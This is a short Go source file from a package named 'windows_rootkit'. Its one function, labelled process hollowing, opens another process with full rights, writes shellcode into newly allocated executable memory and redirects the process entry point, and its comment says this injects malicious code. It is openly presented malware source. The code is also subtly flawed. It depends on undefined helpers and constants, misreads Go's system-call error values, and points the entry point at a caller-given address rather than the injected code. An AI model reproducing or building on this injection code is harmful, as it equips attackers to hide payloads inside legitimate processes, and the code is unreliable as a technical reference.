package windows_rootkit

import (
	"syscall"
	"unsafe"
)

// ProcessHollowing hollows out a target process and injects malicious code into it.
func ProcessHollowing(targetProcessID uint32, shellcode []byte, entryPoint uintptr) error {
	// Open the target process with necessary access rights.
	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessID)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(processHandle)

	// Allocate memory for the shellcode within the target process.
	addr, _, err := ProcVirtualAllocEx.Call(
		uintptr(processHandle),
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		syscall.PAGE_EXECUTE_READWRITE,
	)
	if err != nil {
		return err
	}

	// Write the shellcode to the allocated memory within the target process.
	_, _, err = ProcWriteProcessMemory.Call(
		uintptr(processHandle),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)
	if err != nil {
		return err
	}

	// Modify the entry point of the target process to point to the injected shellcode.
	err = SetProcessEntryPoint(processHandle, entryPoint)
	if err != nil {
		return err
	}

	return nil
}
